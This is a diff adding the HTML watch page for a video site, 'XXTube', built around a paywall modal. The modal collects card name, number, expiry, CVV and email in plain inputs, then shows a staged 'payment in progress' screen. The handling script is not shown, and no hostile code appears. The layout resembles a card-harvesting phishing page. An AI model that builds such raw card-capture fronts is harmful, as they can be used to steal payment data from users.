@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Watch — XXTube</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://vjs.zencdn.net/8.10.0/video-js.css">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+
+<!-- Paywall Modal -->
+<div class="modal-backdrop" id="paywallModal">
+  <div class="paywall-box">
+
+    <!-- Form screen -->
+    <div id="pwForm">
+      <div class="pw-lock">
+        <div class="lock-icon">🔒</div>
+        <h2>Continue Watching</h2>
+        <p>Pay once for this video — yours to rewatch anytime</p>
+      </div>
+      <div class="pw-video-ref">
+        <span class="pw-video-name" id="pwVideoName"></span>
+        <span class="pw-price" id="pwVideoPrice"></span>
+      </div>
+      <div class="pw-fields">
+        <input class="pw-field" type="text" id="cardName" placeholder="Name on card" autocomplete="cc-name">
+        <input class="pw-field" type="text" id="cardNumber" placeholder="Card number" maxlength="19" autocomplete="cc-number">
+        <div class="pw-row">
+          <input class="pw-field" type="text" id="cardExpiry" placeholder="MM / YY" maxlength="7" autocomplete="cc-exp">
+          <input class="pw-field" type="password" id="cardCvv" placeholder="CVV" maxlength="4" autocomplete="cc-csc">
+        </div>
+        <input class="pw-field" type="email" id="payEmail" placeholder="Email — for access recovery" autocomplete="email">
+      </div>
+      <div id="pwError" style="color:#e8001e;font-size:12px;margin-bottom:10px;display:none"></div>
+      <button class="pw-submit" id="pwSubmitBtn">Pay & Continue Watching</button>
+      <p class="pw-secure">Secured by Tender · Card payments only</p>
+      <p class="pw-recover">Already paid? <a id="pwRecoverLink">Recover your access</a></p>
+    </div>
+
+    <!-- Loading screen -->
+    <div id="pwLoading" style="display:none">
+      <div class="spinner-wrap"><div class="spinner"></div></div>
+      <h2>Payment in Progress</h2>
+      <p>Please wait while we process your payment.<br>Do not close this window.</p>
+      <div class="pw-status-row"><span class="status-dot"></span> Securely processing via Tender</div>
+      <p class="pw-timer" id="pwTimer"></p>
+    </div>
+
+    <!-- Success screen -->
+    <div id="pwSuccess" style="display:none">
+      <div class="success-icon">✅</div>
+      <h2>Payment Confirmed</h2>
+      <p>You now have full access to this video.<br>A debit notification will arrive on your registered number shortly.</p>
+      <button class="pw-continue" id="pwContinueBtn">Resume Watching</button>
+    </div>
+
+  </div>
+</div>
+
+<!-- Recover Modal -->
+<div class="modal-backdrop" id="recoverModal">
+  <div class="recover-box">
+    <h2>Recover Your Access</h2>
+    <p>Enter the email you used when paying, or your transaction reference.</p>
+    <input class="pw-field" type="email" id="recoverEmail" placeholder="Email address">
+    <p class="recover-or">— or —</p>
+    <input class="pw-field" type="text" id="recoverRef" placeholder="Transaction reference">
+    <button class="recover-submit" id="recoverSubmit">Find My Access</button>
+    <div id="recoverMsg" style="margin-top:12px;font-size:13px;text-align:center"></div>
+    <a class="recover-cancel" id="recoverCancel">Cancel</a>
+  </div>
+</div>
+
+<!-- Header -->
+<header class="site-header">
+  <div class="header-row">
+    <button class="menu-btn" id="menuBtn"><span></span><span></span><span></span></button>
+    <a href="/" class="site-logo">XX<em>Tube</em></a>
+    <div class="search-wrap">
+      <input type="text" placeholder="Search tutorials…" autocomplete="off">
+      <span class="search-icon">⌕</span>
+    </div>
+    <div class="hdr-actions">
+      <a href="/" class="btn-ghost">← Back</a>
+    </div>
+  </div>
+</header>
+
+<!-- Watch Layout -->
+<div class="watch-wrap">
+  <div class="watch-main">
+
+    <!-- Video.js Player -->
+    <div class="player-container">
+      <video id="xxtube-player" class="video-js vjs-default-skin vjs-big-play-centered"
+             controls preload="auto" data-setup='{}'>
+      </video>
+    </div>
+
+    <!-- Video Info -->
+    <div class="watch-info">
+      <h1 class="video-title-big" id="watchTitle">Loading…</h1>
+      <div class="video-meta-row">
+        <span class="vmr-item" id="watchViews">— views</span>
+        <span class="vmr-item" id="watchDuration">—</span>
+        <span class="vmr-item" id="watchCategory">—</span>
+        <span class="vmr-price" id="watchPrice">—</span>
+      </div>
+      <div class="react-row">
+        <button class="react-btn" id="likeBtn">👍 Like &nbsp;<strong id="likeCount">—</strong></button>
+        <button class="react-btn">👎 Dislike</button>
+        <button class="react-btn">↗ Share</button>
+      </div>
+      <div class="creator-strip" id="creatorStrip"></div>
+      <div class="desc-block" id="watchDesc">Loading video details…</div>
+    </div>
+  </div>
+
+  <!-- Related Videos -->
+  <aside class="watch-sidebar">
+    <p class="related-label">More to watch</p>
+    <div id="relatedList"></div>
+  </aside>
+</div>
+
+<script src="https://vjs.zencdn.net/8.10.0/video.min.js"></script>
+<script src="assets/player.js"></script>
+</body>
+</html>
